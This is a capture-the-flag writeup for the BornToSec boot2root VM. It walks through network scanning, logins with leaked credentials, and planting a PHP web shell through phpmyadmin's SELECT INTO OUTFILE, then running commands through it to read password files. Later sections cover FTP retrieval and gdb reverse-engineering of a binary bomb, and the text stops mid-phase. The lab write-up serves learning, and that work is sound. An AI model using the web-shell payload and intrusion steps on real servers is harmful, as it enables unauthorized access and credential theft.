# Writeup 1

## VM's IP address


I am doing this project on Windows and WSL on top. My VM of choice is VMware Workstation.

Boot2root VM doesn't offer us an ip address so we have to get it ourselves.
As I am doing this on Windows we use `ipconfig` to view all TCP/IP configurations: 

```
    [...]

    Адаптер Ethernet VMware Network Adapter VMnet8:

    DNS-суффикс подключения . . . . . :
    Локальный IPv6-адрес канала . . . : fe80::df42:3c65:6f6c:ac19%31
    IPv4-адрес. . . . . . . . . . . . : 192.168.31.1
    Маска подсети . . . . . . . . . . : 255.255.255.0

    [...]
```

Now we scan for any open ports with `nmap`(I had to turn off my antivirus for this):

```
    daniseed@DESKTOP:~$ nmap 192.168.31.0/24
    Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-29 13:22 MSK
    Nmap scan report for 192.168.31.134
    Host is up (0.72s latency).
    Not shown: 994 closed ports
    PORT    STATE SERVICE
    21/tcp  open  ftp
    22/tcp  open  ssh
    80/tcp  open  http
    143/tcp open  imap
    443/tcp open  https
    993/tcp open  imaps

    Nmap done: 256 IP addresses (1 host up) scanned in 60.71 seconds
```

BornToSec(name of the VM) ip in this instance is `192.168.31.134` and its promissing open ports and services are `ftp`, `ssh`, `http` and `https`. `ssh` and `ftp` are of course are password protected so we cannot get in.

## Webserver

We can check with `curl` if there is anyting on `192.168.31.134:80` and there is:
```
    daniseed@DESKTOP:~$ curl 192.168.31.134
    <!DOCTYPE html>
    <html>
    <head>
            <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
            <title>Hack me if you can</title>
            <meta name='description' content='Simple and clean HTML coming soon / under construction page'/>
            <meta name='keywords' content='coming soon, html, html5, css3, css, under construction'/>
            <link rel="stylesheet" href="style.css" type="text/css" media="screen, projection" />
            <link href='http://fonts.googleapis.com/css?family=Coustard' rel='stylesheet' type='text/css'>

    </head>
    <body>
            <div id="wrapper">
                    <h1>Hack me</h1>
                    <h2>We're Coming Soon</h2>
                    <p>We're wetting our shirts to launch the website.<br />
                    In the mean time, you can connect with us trought</p>
                    <p><a href="https://fr-fr.facebook.com/42Born2Code"><img src="fb.png" alt="Facebook" /></a> <a href="https://plus.google.com/+42Frborn2code"><img src="+.png" alt="Google +" /></a> <a href="https://twitter.com/42born2code"><img src="twitter.png" alt="Twitter" /></a></p>
            </div>
    </body>
    </html>
```

Here is an error page in case we need it. It tells us webserver type at least 

```
    Forbidden
    You don't have permission to access /forum on this server.

    Apache/2.2.22 (Ubuntu) Server at 192.168.31.134 Port 80
```

While we are at it let's use web content scanner `dirb` to find any interesting routes on http(s).
The output is quite long so it is shortened here for the convenience:

```
    daniseed@DESKTOP:~$ dirb https://192.168.31.134
    [...]
    ==> DIRECTORY: https://192.168.31.134/phpmyadmin/
    [...]
    ==> DIRECTORY: https://192.168.31.134/forum/modules/
    [...]
    ==> DIRECTORY: https://192.168.31.134/webmail/plugins/
    [...]
```

So here we have 3 websites to check:
* https://192.168.31.134/phpmyadmin/
* https://192.168.31.134/forum/
* https://192.168.31.134/webmail/

## The Web

### Forum

We are starting with the forum `https://192.168.31.134/forum/`.
There aren't a lot of posts but one by `lmezard` with log dump looks like the most usefull.

```
    Probleme login ? - lmezard, 2015-10-08, 00:10

    [...]
    Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
    [...]
    Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
    [...]
```

Well, it seems like somebody accidentally input their password as a login and didn't think to remove it from logs.
Let's try this login:password combination to get into the forum:
`lmezard:!q\]Ej?*5K5cy*AJ`

I'm in!
A little bit of snooping through the account we get lmezard's (or as it turns out lauries) email - `laurie@borntosec.net`

And here we have a list of other forum users:
```
    Username [asc]	Type
    admin           Admin
    lmezard         User
    qudevide        User
    thor            User	 	 
    wandre          User
    zaz             User
```

Now we know that laurie is careless so I am going to check their login:password combination on ssh, ftp, phpmyadmin and webmail.
And it works for email. 

### Webmail

Time to read some letters. There are only 2 from qudevide and this one has a treat for us

```
    DB Access
    Hey Laurie,

    You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

    Best regards.
```


### Phpmyadmin

Thank's to Laurie we have root password for phpmyadmin: `root/Fg-'kKXBj87E:aJ$`

The most interesting is userdata table forum_db/mlf2_userdata with user passwords but unfortunately for us they are hashed

But as we have root priveleges on phpmyadmin we can insert a php backdoor through SQL injection which will read commands from file we create and execute them.

Here our knowledge of a server type is helpfull.
By default, the Apache web root folder location is at `/var/www/`(we can look it up in phpinfo.php file).
And `templates_c` directory is used for compiled templates and template engine for php Smarty will look there for scripts to execute.
So we want to place our php script into `/var/www/forum/templates_c/`

We need our own PHP code to run shell commands.
To do this, we use the INTO OUTFILE feature that MySQL provides.
Using INTO OUTFILE, it is possible for the output of a query to be redirected into a file on the operating system.
We’ll use some very basic PHP code that will read an argument from the URL and run a command against the operating system, using it as an input.
Here is a final backdoor setup command:

```
    SELECT '<? system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/backdoor.php'
```

We have our backdoor, time to check and use it:

```
    https://192.168.31.134/forum/templates_c/backdoor.php?cmd=pwd
    /var/www/forum/templates_c

    ---------------------------------------------------------------------------------------------------

    https://192.168.31.134/forum/templates_c/backdoor.php?cmd=ls%20-la
    total 455
    [...]
    -rw-rw-rw- 1 mysql mysql 31 Dec 29 14:42 backdoor.php -rw-rw-rw- 1 mysql mysql 28 Dec 29 14:46 backdoor2.php
    [...]

    Note: `%20` - url-encoding for space

    ---------------------------------------------------------------------------------------------------

    https://192.168.31.134/forum/templates_c/backdoor.php?cmd=ls%20/home
    LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz

    ---------------------------------------------------------------------------------------------------

    https://192.168.31.134/forum/templates_c/backdoor.php?cmd=ls%20-la%20/home
    total 0
    drwxrwx--x 9 www-data root 126 Oct 13 2015 . 
    drwxr-xr-x 1 root root 200 Dec 29 2022 .. 
    drwxr-x--- 2 www-data www-data 31 Oct 8 2015 LOOKATME 
    drwxr-x--- 6 ft_root ft_root 156 Jun 17 2017 ft_root 
    drwxr-x--- 3 laurie laurie 143 Oct 15 2015 laurie 
    drwxr-x--- 4 laurie@borntosec.net laurie@borntosec.net 113 Oct 15 2015 laurie@borntosec.net 
    dr-xr-x--- 2 lmezard lmezard 61 Oct 15 2015 lmezard 
    drwxr-x--- 3 thor thor 129 Oct 15 2015 thor 
    drwxr-x--- 4 zaz zaz 147 Oct 15 2015 zaz

    ---------------------------------------------------------------------------------------------------

    https://192.168.31.134/forum/templates_c/backdoor.php?cmd=ls%20-la%20/home/LOOKATME
    total 1 drwxr-x--- 2 www-data www-data 31 Oct 8 2015 . 
    drwxrwx--x 9 www-data root 126 Oct 13 2015 .. -rwxr-x--- 1 www-data www-data 25 Oct 8 2015 password

    ---------------------------------------------------------------------------------------------------

    https://192.168.31.134/forum/templates_c/backdoor.php?cmd=cat%20/home/LOOKATME/password
    lmezard:G!@M6f4Eatau{sF"
```

We have new login:password combination: `lmezard:G!@M6f4Eatau{sF"`
We will try to use this combination everywhere and it works for ftp


## FTP

Let's connect to ftp and get any files stored there:

```
    daniseed@DESKTOP:~$ ftp
    ftp> open
    (to) 192.168.31.134
    Connected to 192.168.31.134.
    220 Welcome on this server
    Name (192.168.31.134:daniseed): lmezard
    331 Please specify the password.
    Password:
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> pass
    Passive mode on.
    ftp> ls
    227 Entering Passive Mode (192,168,31,134,57,125).
    150 Here comes the directory listing.
    -rwxr-x---    1 1001     1001           96 Oct 15  2015 README
    -rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
    226 Directory send OK.
    ftp> get README
    local: README remote: README
    227 Entering Passive Mode (192,168,31,134,136,22).
    150 Opening BINARY mode data connection for README (96 bytes).
    226 Transfer complete.
    96 bytes received in 0.00 secs (593.3544 kB/s)
    ftp> get fun
    local: fun remote: fun
    227 Entering Passive Mode (192,168,31,134,23,210).
    150 Opening BINARY mode data connection for fun (808960 bytes).
    226 Transfer complete.
    808960 bytes received in 0.08 secs (9.2939 MB/s)
```

We got 2 files out of this "REDME" and "fun":

```
    daniseed@DESKTOP:~$ cat README
    Complete this little challenge and use the result as password for user 'laurie' to login in ssh
    daniseed@DESKTOP:~$ file fun
    fun: POSIX tar archive (GNU)
```

### ft_fun

"fun" file is an archive full of `.pcap` files but WireShark and `file` command tells us that they are not real 
```
    daniseed@DESKTOP:~$ tar -xvf fun
    ft_fun/

    daniseed@DESKTOP:~/ft_fun$ file G1QLV.pcap
    G1QLV.pcap: ASCII text
    daniseed@DESKTOP:~/ft_fun$ cat G1QLV.pcap
    }void useless() {


    //file679
```
This fake .pcap files are numbered and have what looks to be parts of code in them.
If we sort .pcap files by their numbers with `not_pcap_sort.py` script we get a program like this (shortened for convenience):

```
char getme1() {
	return 'I';
}


int main() {
        printf("M");
        printf("Y");
        printf(" ");
        printf("P");
        printf("A");
        printf("S");
        printf("S");
        printf("W");
        printf("O");
        printf("R");
        printf("D");
        printf(" ");
        printf("I");
        printf("S");
        printf(":");
        printf(" ");
        printf("%c",getme1());
        printf("%c",getme2());
        printf("%c",getme3());
        printf("%c",getme4());
        printf("%c",getme5());
        printf("%c",getme6());
        printf("%c",getme7());
        printf("%c",getme8());
        printf("%c",getme9());
        printf("%c",getme10());
        printf("%c",getme11());
        printf("%c",getme12());
        printf("\n");
        printf("Now SHA-256 it and submit");
}
```
After we run this c-program we get this:

```
gcc pcap.c
daniseed@DESKTOP:~$ ./a.out
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

After encrypting this password with [SHA-256](https://emn178.github.io/online-tools/sha256.html) we can have our password for laurie's ssh: `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`

## SSH

### laurie

After we login as laurie we check whether there are any new puzzles for us and there are:

```
laurie@BornToSecHackMe:~$ ls
bomb  README
laurie@BornToSecHackMe:~$ cat README
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).

laurie@BornToSecHackMe:~$ ./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
P

BOOM!!!
The bomb has blown up.

```

So it looks like we have to "diffuse the bomb" by discovering solutions for 6 challenges. Disassembling each level is going to be the way to go. We will be using gdb and Ghidra(to help with interpreting assembly).

#### Level1

```
(gdb) disass phase_1
Dump of assembler code for function phase_1:
   0x08048b20 <+0>:     push   %ebp
   0x08048b21 <+1>:     mov    %esp,%ebp
   0x08048b23 <+3>:     sub    $0x8,%esp
   0x08048b26 <+6>:     mov    0x8(%ebp),%eax
   0x08048b29 <+9>:     add    $0xfffffff8,%esp
   0x08048b2c <+12>:    push   $0x80497c0
   0x08048b31 <+17>:    push   %eax
   0x08048b32 <+18>:    call   0x8049030 <strings_not_equal>
   0x08048b37 <+23>:    add    $0x10,%esp
   0x08048b3a <+26>:    test   %eax,%eax
   0x08048b3c <+28>:    je     0x8048b43 <phase_1+35>
   0x08048b3e <+30>:    call   0x80494fc <explode_bomb>
   0x08048b43 <+35>:    mov    %ebp,%esp
   0x08048b45 <+37>:    pop    %ebp
   0x08048b46 <+38>:    ret
End of assembler dump.
(gdb) x /s 0x80497c0
0x80497c0:       "Public speaking is very easy."
```
This level is easy. Input is compared with a simple string stored in the same function.

**Answer:** `Public speaking is very easy.`

#### Level2

```
(gdb) disass phase_2
Dump of assembler code for function phase_2:
   0x08048b48 <+0>:     push   %ebp
   0x08048b49 <+1>:     mov    %esp,%ebp
   0x08048b4b <+3>:     sub    $0x20,%esp
   0x08048b4e <+6>:     push   %esi
   0x08048b4f <+7>:     push   %ebx
   0x08048b50 <+8>:     mov    0x8(%ebp),%edx
   0x08048b53 <+11>:    add    $0xfffffff8,%esp
   0x08048b56 <+14>:    lea    -0x18(%ebp),%eax
   0x08048b59 <+17>:    push   %eax
   0x08048b5a <+18>:    push   %edx
   0x08048b5b <+19>:    call   0x8048fd8 <read_six_numbers>
   0x08048b60 <+24>:    add    $0x10,%esp
   0x08048b63 <+27>:    cmpl   $0x1,-0x18(%ebp)             // six_numbers[0] >= 1
   0x08048b67 <+31>:    je     0x8048b6e <phase_2+38>
   0x08048b69 <+33>:    call   0x80494fc <explode_bomb>
   0x08048b6e <+38>:    mov    $0x1,%ebx
   0x08048b73 <+43>:    lea    -0x18(%ebp),%esi
   0x08048b76 <+46>:    lea    0x1(%ebx),%eax
   0x08048b79 <+49>:    imul   -0x4(%esi,%ebx,4),%eax       // six_numbers[i - 1] * (i + 1) 	
   0x08048b7e <+54>:    cmp    %eax,(%esi,%ebx,4)           // six_numbers[i] != six_numbers[i - 1] * (i + 1) 
   0x08048b81 <+57>:    je     0x8048b88 <phase_2+64>
   0x08048b83 <+59>:    call   0x80494fc <explode_bomb>
   0x08048b88 <+64>:    inc    %ebx
   0x08048b89 <+65>:    cmp    $0x5,%ebx
   0x08048b8c <+68>:    jle    0x8048b76 <phase_2+46>
   0x08048b8e <+70>:    lea    -0x28(%ebp),%esp
   0x08048b91 <+73>:    pop    %ebx
   0x08048b92 <+74>:    pop    %esi
   0x08048b93 <+75>:    mov    %ebp,%esp
   0x08048b95 <+77>:    pop    %ebp
   0x08048b96 <+78>:    ret
End of assembler dump.
```
This code translates to pseudo code like this:

```
i = 1
do {
	if (six_numbers[i] == six_numbers[i - 1] * (i + 1))
		++i
	else
		fail
} while (i <= 5)
```

Here the program awaits 6 numbers as input and from the hint we know that the second number is "2".
With this calculating other numbers is trivial: 

> 0: 1                      | 
> 1: 1 * (1 + 1) = 2        |
> 2: 2 * (2 + 1) = 6        | 
> 3: 6 * (3 + 1) = 24       |
> 4: 24 * (4 + 1) = 120     |
> 5: 120 * (5 + 1) = 720    |

**Answer:** `1 2 6 24 120 720`

#### Level3

```
(gdb) disass phase_3
Dump of assembler code for function phase_3:
   0x08048b98 <+0>:     push   %ebp
   0x08048b99 <+1>:     mov    %esp,%ebp
   0x08048b9b <+3>:     sub    $0x14,%esp
   0x08048b9e <+6>:     push   %ebx
   0x08048b9f <+7>:     mov    0x8(%ebp),%edx
   0x08048ba2 <+10>:    add    $0xfffffff4,%esp
   0x08048ba5 <+13>:    lea    -0x4(%ebp),%eax
   0x08048ba8 <+16>:    push   %eax
   0x08048ba9 <+17>:    lea    -0x5(%ebp),%eax
   0x08048bac <+20>:    push   %eax
   0x08048bad <+21>:    lea    -0xc(%ebp),%eax
   0x08048bb0 <+24>:    push   %eax
   0x08048bb1 <+25>:    push   $0x80497de					// "%d %c %d"
   0x08048bb6 <+30>:    push   %edx
   0x08048bb7 <+31>:    call   0x8048860 <sscanf@plt>
   0x08048bbc <+36>:    add    $0x20,%esp
   0x08048bbf <+39>:    cmp    $0x2,%eax					// 2
   0x08048bc2 <+42>:    jg     0x8048bc9 <phase_3+49>
   0x08048bc4 <+44>:    call   0x80494fc <explode_bomb>
   0x08048bc9 <+49>:    cmpl   $0x7,-0xc(%ebp)				// 7			
   0x08048bcd <+53>:    ja     0x8048c88 <phase_3+240>
   0x08048bd3 <+59>:    mov    -0xc(%ebp),%eax
   0x08048bd6 <+62>:    jmp    *0x80497e8(,%eax,4)
   0x08048bdd <+69>:    lea    0x0(%esi),%esi
   0x08048be0 <+72>:    mov    $0x71,%bl					// q			
   0x08048be2 <+74>:    cmpl   $0x309,-0x4(%ebp)			// 777
   0x08048be9 <+81>:    je     0x8048c8f <phase_3+247>
   0x08048bef <+87>:    call   0x80494fc <explode_bomb>
   0x08048bf4 <+92>:    jmp    0x8048c8f <phase_3+247>
   0x08048bf9 <+97>:    lea    0x0(%esi,%eiz,1),%esi
   0x08048c00 <+104>:   mov    $0x62,%bl					// b
   0x08048c02 <+106>:   cmpl   $0xd6,-0x4(%ebp)				// 214
   0x08048c09 <+113>:   je     0x8048c8f <phase_3+247>
   0x08048c0f <+119>:   call   0x80494fc <explode_bomb>
   0x08048c14 <+124>:   jmp    0x8048c8f <phase_3+247>
   0x08048c16 <+126>:   mov    $0x62,%bl					// b
   0x08048c18 <+128>:   cmpl   $0x2f3,-0x4(%ebp)			// 755
   0x08048c1f <+135>:   je     0x8048c8f <phase_3+247>
   0x08048c21 <+137>:   call   0x80494fc <explode_bomb>
   0x08048c26 <+142>:   jmp    0x8048c8f <phase_3+247>
   0x08048c28 <+144>:   mov    $0x6b,%bl					// k					
   0x08048c2a <+146>:   cmpl   $0xfb,-0x4(%ebp)				// 251
   0x08048c31 <+153>:   je     0x8048c8f <phase_3+247>
   0x08048c33 <+155>:   call   0x80494fc <explode_bomb>
   0x08048c38 <+160>:   jmp    0x8048c8f <phase_3+247>
   0x08048c3a <+162>:   lea    0x0(%esi),%esi
   0x08048c40 <+168>:   mov    $0x6f,%bl					// o
   0x08048c42 <+170>:   cmpl   $0xa0,-0x4(%ebp)				// 160
   0x08048c49 <+177>:   je     0x8048c8f <phase_3+247>
   0x08048c4b <+179>:   call   0x80494fc <explode_bomb>
   0x08048c50 <+184>:   jmp    0x8048c8f <phase_3+247>
   0x08048c52 <+186>:   mov    $0x74,%bl					// t
   0x08048c54 <+188>:   cmpl   $0x1ca,-0x4(%ebp)			// 458
   0x08048c5b <+195>:   je     0x8048c8f <phase_3+247>
   0x08048c5d <+197>:   call   0x80494fc <explode_bomb>
   0x08048c62 <+202>:   jmp    0x8048c8f <phase_3+247>
   0x08048c64 <+204>:   mov    $0x76,%bl					// v
   0x08048c66 <+206>:   cmpl   $0x30c,-0x4(%ebp)			// 780
   0x08048c6d <+213>:   je     0x8048c8f <phase_3+247>
   0x08048c6f <+215>:   call   0x80494fc <explode_bomb>
   0x08048c74 <+220>:   jmp    0x8048c8f <phase_3+247>
   0x08048c76 <+222>:   mov    $0x62,%bl					// b
   0x08048c78 <+224>:   cmpl   $0x20c,-0x4(%ebp)			// 524
   0x08048c7f <+231>:   je     0x8048c8f <phase_3+247>
   0x08048c81 <+233>:   call   0x80494fc <explode_bomb>
   0x08048c86 <+238>:   jmp    0x8048c8f <phase_3+247>
   0x08048c88 <+240>:   mov    $0x78,%bl					// x
   0x08048c8a <+242>:   call   0x80494fc <explode_bomb>
   0x08048c8f <+247>:   cmp    -0x5(%ebp),%bl
   0x08048c92 <+250>:   je     0x8048c99 <phase_3+257>
   0x08048c94 <+252>:   call   0x80494fc <explode_bomb>
   0x08048c99 <+257>:   mov    -0x18(%ebp),%ebx
   0x08048c9c <+260>:   mov    %ebp,%esp
   0x08048c9e <+262>:   pop    %ebp
   0x08048c9f <+263>:   ret
End of assembler dump
```
Pseudo code of the main part of this phase:

```
switch(first) {
case 0:
    c = 'q';
    if (third != 777)
        fail
case 1:
    c = 'b';
    if (third != 214)
        fail
case 2:
    c = 'b';
    if (third != 755)
        fail
case 3:
    c = 'k';
    if (third != 251)
        fail
case 4:
    c = 'o';
    if (third != 160)
        fail
case 5:
    c = 't';
    if (third != 458)
        fail
case 6:
    c = 'v';
    if (third != 780)
        fail
case 7:
    c = 'b';
    if (third != 524)
    	fail
default:
    c = 'x';
    fail
}
if (c != second)
    fail
```

From this program we can see that the required input consists of 3 parts - number, letter and another number.
From disassemply we know all correct inputs and the hint for this phase is "b" so we have 3 possible answers:
> 1 b 214
> 2 b 755
> 7 b 524

*This unfortunately makes finding the password for thor difficult*

#### Level4
```
(gdb) disass phase_4
Dump of assembler code for function phase_4:
   0x08048ce0 <+0>:     push   %ebp
   0x08048ce1 <+1>:     mov    %esp,%ebp
   0x08048ce3 <+3>:     sub    $0x18,%esp
   0x08048ce6 <+6>:     mov    0x8(%ebp),%edx
   0x08048ce9 <+9>:     add    $0xfffffffc,%esp			// 4294967292
   0x08048cec <+12>:    lea    -0x4(%ebp),%eax
   0x08048cef <+15>:    push   %eax
   0x08048cf0 <+16>:    push   $0x8049808				// "%d"
   0x08048cf5 <+21>:    push   %edx
   0x08048cf6 <+22>:    call   0x8048860 <sscanf@plt>
   0x08048cfb <+27>:    add    $0x10,%esp				// 0x10 = 16
   0x08048cfe <+30>:    cmp    $0x1,%eax
   0x08048d01 <+33>:    jne    0x8048d09 <phase_4+41>
   0x08048d03 <+35>:    cmpl   $0x0,-0x4(%ebp)
   0x08048d07 <+39>:    jg     0x8048d0e <phase_4+46>
   0x08048d09 <+41>:    call   0x80494fc <explode_bomb>
   0x08048d0e <+46>:    add    $0xfffffff4,%esp			// 4294967284
   0x08048d11 <+49>:    mov    -0x4(%ebp),%eax
   0x08048d14 <+52>:    push   %eax
   0x08048d15 <+53>:    call   0x8048ca0 <func4>
   0x08048d1a <+58>:    add    $0x10,%esp
   0x08048d1d <+61>:    cmp    $0x37,%eax				// 55
   0x08048d20 <+64>:    je     0x8048d27 <phase_4+71>
   0x08048d22 <+66>:    call   0x80494fc <explode_bomb>
   0x08048d27 <+71>:    mov    %ebp,%esp
   0x08048d29 <+73>:    pop    %ebp
   0x08048d2a <+74>:    ret
End of assembler dump.
(gdb) disass func4
Dump of assembler code for function func4:
   0x08048ca0 <+0>:     push   %ebp
   0x08048ca1 <+1>:     mov    %esp,%ebp
   0x08048ca3 <+3>:     sub    $0x10,%esp
   0x08048ca6 <+6>:     push   %esi
   0x08048ca7 <+7>:     push   %ebx
   0x08048ca8 <+8>:     mov    0x8(%ebp),%ebx
   0x08048cab <+11>:    cmp    $0x1,%ebx
   0x08048cae <+14>:    jle    0x8048cd0 <func4+48>
   0x08048cb0 <+16>:    add    $0xfffffff4,%esp
   0x08048cb3 <+19>:    lea    -0x1(%ebx),%eax
   0x08048cb6 <+22>:    push   %eax
   0x08048cb7 <+23>:    call   0x8048ca0 <func4>
   0x08048cbc <+28>:    mov    %eax,%esi
   0x08048cbe <+30>:    add    $0xfffffff4,%esp
   0x08048cc1 <+33>:    lea    -0x2(%ebx),%eax
   0x08048cc4 <+36>:    push   %eax
   0x08048cc5 <+37>:    call   0x8048ca0 <func4>
   0x08048cca <+42>:    add    %esi,%eax
   0x08048ccc <+44>:    jmp    0x8048cd5 <func4+53>
   0x08048cce <+46>:    mov    %esi,%esi
   0x08048cd0 <+48>:    mov    $0x1,%eax
   0x08048cd5 <+53>:    lea    -0x18(%ebp),%esp
   0x08048cd8 <+56>:    pop    %ebx
   0x08048cd9 <+57>:    pop    %esi
   0x08048cda <+58>:    mov    %ebp,%esp
   0x08048cdc <+60>:    pop    %ebp
   0x08048cdd <+61>:    ret
End of assembler dump.
```
Pseudo code for these 2 functions:

```
int func4(int nbr) {
    if (nbr <= 1)
        return 1;
    int x = func4(nbr - 1);
    int y = func4(nbr - 2);
    return x + y;
}

void phase_4(char *str) {
    int nbr;
    l = sscanf(str, "%d", nbr);
    if (l != 1) {
        explode_bomb();
    }
    if (nbr > 0) {
        if (func4(nbr) != 55)
            explode_bomb();
    }
    return;
}
```

Input should be a number between 1 and 9. By recreating this program and trying each one we find out that 9 is the answer

**Answer:** 9

#### Level5

```
(gdb) disass phase_5
Dump of assembler code for function phase_5:
   0x08048d2c <+0>:     push   %ebp
   0x08048d2d <+1>:     mov    %esp,%ebp
   0x08048d2f <+3>:     sub    $0x10,%esp
   0x08048d32 <+6>:     push   %esi
   0x08048d33 <+7>:     push   %ebx
   0x08048d34 <+8>:     mov    0x8(%ebp),%ebx
   0x08048d37 <+11>:    add    $0xfffffff4,%esp
   0x08048d3a <+14>:    push   %ebx
   0x08048d3b <+15>:    call   0x8049018 <string_length>
   0x08048d40 <+20>:    add    $0x10,%esp
   0x08048d43 <+23>:    cmp    $0x6,%eax				// len != 6
   0x08048d46 <+26>:    je     0x8048d4d <phase_5+33>
   0x08048d48 <+28>:    call   0x80494fc <explode_bomb>
   0x08048d4d <+33>:    xor    %edx,%edx				// i = 0
   0x08048d4f <+35>:    lea    -0x8(%ebp),%ecx
   0x08048d52 <+38>:    mov    $0x804b220,%esi			// key = "isrveawhobpnutfg\260\001"
   0x08048d57 <+43>:    mov    (%edx,%ebx,1),%al
   0x08048d5a <+46>:    and    $0xf,%al
   0x08048d5c <+48>:    movsbl %al,%eax
   0x08048d5f <+51>:    mov    (%eax,%esi,1),%al
   0x08048d62 <+54>:    mov    %al,(%edx,%ecx,1)		// str[i] = key[str[i] & 0xf]
   0x08048d65 <+57>:    inc    %edx					// i++
   0x08048d66 <+58>:    cmp    $0x5,%edx				// i <= 5
   0x08048d69 <+61>:    jle    0x8048d57 <phase_5+43>
   0x08048d6b <+63>:    movb   $0x0,-0x2(%ebp)
   0x08048d6f <+67>:    add    $0xfffffff8,%esp
   0x08048d72 <+70>:    push   $0x804980b				// "giants"
   0x08048d77 <+75>:    lea    -0x8(%ebp),%eax
   0x08048d7a <+78>:    push   %eax
   0x08048d7b <+79>:    call   0x8049030 <strings_not_equal>
   0x08048d80 <+84>:    add    $0x10,%esp
   0x08048d83 <+87>:    test   %eax,%eax
   0x08048d85 <+89>:    je     0x8048d8c <phase_5+96>
   0x08048d87 <+91>:    call   0x80494fc <explode_bomb>
   0x08048d8c <+96>:    lea    -0x18(%ebp),%esp
   0x08048d8f <+99>:    pop    %ebx
   0x08048d90 <+100>:   pop    %esi
   0x08048d91 <+101>:   mov    %ebp,%esp
   0x08048d93 <+103>:   pop    %ebp
   0x08048d94 <+104>:   ret
End of assembler dump.
```
Pseudo code:

```
void phase_5(char *str) {
    int l = string_length(line);
    if (l != 6)
        explode_bomb();
    i = 0;
    char *key = "isrveawhobpnutfg"
    while (i <= 5) {
        str[i] = key[str[i] & 0xf];
        i++;
    }
    if (strings_not_equal(str, "giants") != 0) {
        explode_bomb();
    }
    return;
}
```
This simple program will hepl us discover letter correlation for this phase:

```
#include <unistd.h>
#include <stdio.h>
int main() {
        char res[27];
        char* str = "abcdefghijklmnopqrstuvwxyz\0";
        int i = 0;
        char *key = "isrveawhobpnutfg";
        res[26] = '\0';
        while (i <= 25) {
                int idx = str[i] & 0xf;
                res[i] = key[idx];
                i++;
        }
        printf("%s\n", res);
        return 0;
}
```

> abcdefghijklmnopqrstuvwxyz
> srveawhobpnutfgisrveawhobp

As some letters are repeated there are 4 different encodings for giant:
> opekma
> opekma
> opekmq
> opukmq

*Another level with several possible options for password. Fun*

#### Level6
```
(gdb) disass phase_6
Dump of assembler code for function phase_6:
   0x08048d98 <+0>:     push   %ebp
   0x08048d99 <+1>:     mov    %esp,%ebp
   0x08048d9b <+3>:     sub    $0x4c,%esp
   0x08048d9e <+6>:     push   %edi
   0x08048d9f <+7>:     push   %esi
   0x08048da0 <+8>:     push   %ebx
   0x08048da1 <+9>:     mov    0x8(%ebp),%edx
   0x08048da4 <+12>:    movl   $0x804b26c,-0x34(%ebp)			// node1, 0x34 = 52
   0x08048dab <+19>:    add    $0xfffffff8,%esp
   0x08048dae <+22>:    lea    -0x18(%ebp),%eax
   0x08048db1 <+25>:    push   %eax
   0x08048db2 <+26>:    push   %edx
   0x08048db3 <+27>:    call   0x8048fd8 <read_six_numbers>
   0x08048db8 <+32>:    xor    %edi,%edi
   0x08048dba <+34>:    add    $0x10,%esp
   0x08048dbd <+37>:    lea    0x0(%esi),%esi
   0x08048dc0 <+40>:    lea    -0x18(%ebp),%eax
   0x08048dc3 <+43>:    mov    (%eax,%edi,4),%eax
   0x08048dc6 <+46>:    dec    %eax
   0x08048dc7 <+47>:    cmp    $0x5,%eax
   0x08048dca <+50>:    jbe    0x8048dd1 <phase_6+57>
   0x08048dcc <+52>:    call   0x80494fc <explode_bomb>
   0x08048dd1 <+57>:    lea    0x1(%edi),%ebx
   0x08048dd4 <+60>:    cmp    $0x5,%ebx
   0x08048dd7 <+63>:    jg     0x8048dfc <phase_6+100>
   0x08048dd9 <+65>:    lea    0x0(,%edi,4),%eax
   0x08048de0 <+72>:    mov    %eax,-0x38(%ebp)
   0x08048de3 <+75>:    lea    -0x18(%ebp),%esi
   0x08048de6 <+78>:    mov    -0x38(%ebp),%edx
   0x08048de9 <+81>:    mov    (%edx,%esi,1),%eax
   0x08048dec <+84>:    cmp    (%esi,%ebx,4),%eax
   0x08048def <+87>:    jne    0x8048df6 <phase_6+94>
   0x08048df1 <+89>:    call   0x80494fc <explode_bomb>
   0x08048df6 <+94>:    inc    %ebx
   0x08048df7 <+95>:    cmp    $0x5,%ebx
   0x08048dfa <+98>:    jle    0x8048de6 <phase_6+78>
   0x08048dfc <+100>:   inc    %edi
   0x08048dfd <+101>:   cmp    $0x5,%edi
   0x08048e00 <+104>:   jle    0x8048dc0 <phase_6+40>
   0x08048e02 <+106>:   xor    %edi,%edi
   0x08048e04 <+108>:   lea    -0x18(%ebp),%ecx
   0x08048e07 <+111>:   lea    -0x30(%ebp),%eax
   0x08048e0a <+114>:   mov    %eax,-0x3c(%ebp)
   0x08048e0d <+117>:   lea    0x0(%esi),%esi
   0x08048e10 <+120>:   mov    -0x34(%ebp),%esi
   0x08048e13 <+123>:   mov    $0x1,%ebx
   0x08048e18 <+128>:   lea    0x0(,%edi,4),%eax
   0x08048e1f <+135>:   mov    %eax,%edx
   0x08048e21 <+137>:   cmp    (%eax,%ecx,1),%ebx
   0x08048e24 <+140>:   jge    0x8048e38 <phase_6+160>
   0x08048e26 <+142>:   mov    (%edx,%ecx,1),%eax
   0x08048e29 <+145>:   lea    0x0(%esi,%eiz,1),%esi
   0x08048e30 <+152>:   mov    0x8(%esi),%esi
   0x08048e33 <+155>:   inc    %ebx
   0x08048e34 <+156>:   cmp    %eax,%ebx
   0x08048e36 <+158>:   jl     0x8048e30 <phase_6+152>
   0x08048e38 <+160>:   mov    -0x3c(%ebp),%edx
   0x08048e3b <+163>:   mov    %esi,(%edx,%edi,4)
   0x08048e3e <+166>:   inc    %edi
   0x08048e3f <+167>:   cmp    $0x5,%edi
